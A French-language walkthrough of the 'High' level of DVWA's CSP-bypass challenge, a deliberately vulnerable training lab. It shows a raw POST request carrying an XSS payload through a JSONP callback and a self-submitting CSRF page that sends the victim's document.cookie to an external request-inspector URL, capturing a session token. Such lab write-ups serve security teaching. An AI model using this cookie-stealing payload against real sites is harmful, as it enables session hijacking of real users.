# Niveau "High"

Le niveau "High" permet de résoudre une opération mathématique grâce à un appel JSONP :

![](../../../../.gitbook/assets/70f2e8752b05cad71757484179b748c5.png)

La méthode de callback se nomme `solveSum()` :

![](../../../../.gitbook/assets/0985bcfa7dbd7e1e9ab39c4e6eabcf5c.png)

Et la réponse permet de résoudre l'opération :

![](../../../../.gitbook/assets/bfadd48cbdebc11e02195c4b87a1d28d.png)

Dans un premier temps, j'ai intercepté la requête du callback afin d'y injecter un bout de JS :

![](../../../../.gitbook/assets/c6a8393d825a817647d8f8cf951ff9fc.png)

Cela semble fonctionner :

![](../../../../.gitbook/assets/14e7d64309d7f3a41bd7dc31ae7e49dd.png)

Le problème est qu'il n'est pas possible de soumettre notre payload à la victime car le `Content-Type` de la réponse est de type `application/json` et donc non exploitable en l'état :

![](../../../../.gitbook/assets/56accc4f100b01e32ab4c66a8438505a.png)

![](../../../../.gitbook/assets/f9b5e242aa1f34ade2d68c1f6327903b.png)

Etant bloqué mais voulant aller plus loin, je suis allé voir ce que d'autres personnes avaient réussi à faire. Je suis tombé sur ce [writeup](http://halazi.xin/2019/01/09/DVWA-CSP-BYPASS/) qui suit la démarche suivante :

* Analyser les sources du challenge permet d'identifier un endpoint de type **`POST`** autorisant d'inclure une donnée dans le page csp :

![](../../../../.gitbook/assets/ccf82f8a7c8b4513a015b1dcd13c8c9f.png)

La requête suivante devient donc possible :

```
POST /vulnerabilities/csp/ HTTP/1.1
Host: 192.168.56.203:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.56.203:8080/security.php
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=b4rgbmn3q7l71tide90m809bj3; security=high
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 71

include=<script src="source/jsonp.php?callback=alert(1);"></script>
```

{% hint style="warning" %}
Attention à ne pas oublier le Content-Type pour la requête POST
{% endhint %}

Et en effet, le script est bien exécuté :

![](../../../../.gitbook/assets/14b35a2694d9784692b57fd9be32eff2.png)

Le problème ici est que pour connaitre ce endpoint en **`POST`** il fallait regarder les sources (ou le deviner). En général je préfère ne regarder les sources qu'après avoir terminé le challenge.

Bien que l'auteur du writeup n'indique pas comment, il faut maintenant trouver un vecteur d'attaque contre la victime. J'utilise à nouveau l'exploitation de la faille CSRF, présente également sur ce niveau, en hébergeant le script malicieux suivant sur mon serveur :

```markup
<html>
    <head>
        <title>Exploitation POST XSS</title>
    </head>

    <body>
        <p>Coucou !</p>
        <form action="http://192.168.56.203:8080/vulnerabilities/csp/" method="POST" name="postExploitXSS">
            <input type="text" name="include" value="<script src=&quot;source/jsonp.php?callback=fetch('https://requestinspector.com/inspect/01dt9afwk20cb3xj8f1dwfdj6b?cookie='%2Bdocument.cookie);&quot;></script>">
            <button type="submit">Envoyer le message</button>
        </form>

        <script>
            document.forms['postExploitXSS'].submit();
        </script>
    </body>
</html>
```

{% hint style="info" %}
Attention à l'encodage de certains caractères spéciaux au niveau de la valeur à envoyer
{% endhint %}

Lorsque la victime (authentifiée) visite ma page malicieuse, je subtilise son jeton de session :

![](../../../../.gitbook/assets/07f3f7439e05a98dcb2a5eb628e005f6.png)
